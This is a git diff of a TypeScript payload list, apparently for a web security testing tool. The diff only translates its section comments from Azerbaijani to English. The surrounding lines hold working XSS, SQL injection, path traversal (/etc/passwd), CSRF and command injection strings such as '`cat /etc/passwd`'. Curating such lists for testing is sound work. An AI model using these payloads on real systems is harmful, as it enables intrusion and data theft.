@@ -5,7 +5,7 @@ export interface PayloadItem {
 }
 
 export const payloadsData: PayloadItem[] = [
-  // --- XSS (Giriş Süzgəci və Skript Sınaqları - 100 ədəd) ---
+  // --- XSS (Input Filter and Script Vectors - 100 items) ---
   { id: 1, category: 'XSS', value: "<script>alert(1)</script>" },
   { id: 2, category: 'XSS', value: "<img src=x onerror=alert(1)>" },
   { id: 3, category: 'XSS', value: "<svg/onload=alert(1)>" },
@@ -107,7 +107,7 @@ export const payloadsData: PayloadItem[] = [
   { id: 99, category: 'XSS', value: "<div draggable=\"true\" ondrag=alert(1)>Drag me</div>" },
   { id: 100, category: 'XSS', value: "<form onsubmit=alert(1)><input type=submit></form>" },
 
-  // --- SQLi (Verilər Bazası Sorğu Doğrulamaları - 100 ədəd) ---
+  // --- SQLi (Database Query Injections - 100 items) ---
   { id: 101, category: 'SQLi', value: "' OR '1'='1" },
   { id: 102, category: 'SQLi', value: "' OR 1=1--" },
   { id: 103, category: 'SQLi', value: "admin' --" },
@@ -209,7 +209,7 @@ export const payloadsData: PayloadItem[] = [
   { id: 199, category: 'SQLi', value: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--" },
   { id: 200, category: 'SQLi', value: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--" },
 
-  // --- Traversal (Fayl Yolu və Direktoriya Şablonları - 100 ədəd) ---
+  // --- Traversal (File Path & Directory Traversal - 100 items) ---
   { id: 201, category: 'Traversal', value: "../../../../etc/passwd" },
   { id: 202, category: 'Traversal', value: "..\\..\\..\\..\\windows\\win.ini" },
   { id: 203, category: 'Traversal', value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" },
@@ -311,7 +311,7 @@ export const payloadsData: PayloadItem[] = [
   { id: 299, category: 'Traversal', value: "/etc/aliases" },
   { id: 300, category: 'Traversal', value: "/etc/anacrontab" },
 
-  // --- CSRF (Sessiya Təhlükəsizliyi və Doğrulama Şablonları - 100 ədəd) ---
+  // --- CSRF (Session Security & Validation Vectors - 100 items) ---
   { id: 301, category: 'CSRF', value: "<img src=\"http://target.com/admin/delete?id=1\" width=\"0\" height=\"0\" />" },
   { id: 302, category: 'CSRF', value: "<form action=\"http://target.com/updateProfile\" method=\"POST\" id=\"csrfForm\"><input type=\"hidden\" name=\"email\" value=\"tester@example.com\" /></form><script>document.getElementById('csrfForm').submit();</script>" },
   { id: 303, category: 'CSRF', value: "<iframe src=\"http://target.com/transfer?amount=1000&to=audit\" style=\"display:none;\"></iframe>" },
@@ -413,7 +413,7 @@ export const payloadsData: PayloadItem[] = [
   { id: 399, category: 'CSRF', value: "<form action=\"http://target.com/api/history/clear\" method=\"POST\"></form>" },
   { id: 400, category: 'CSRF', value: "<form action=\"http://target.com/api/cache/purge\" method=\"POST\"></form>" },
 
-  // --- Command Injection (Sistem Əmri Sınaqları - 100 ədəd) ---
+  // --- Command Injection (System Command Vectors - 100 items) ---
   { id: 401, category: 'Command', value: "; id" },
   { id: 402, category: 'Command', value: "| whoami" },
   { id: 403, category: 'Command', value: "`cat /etc/passwd`" },
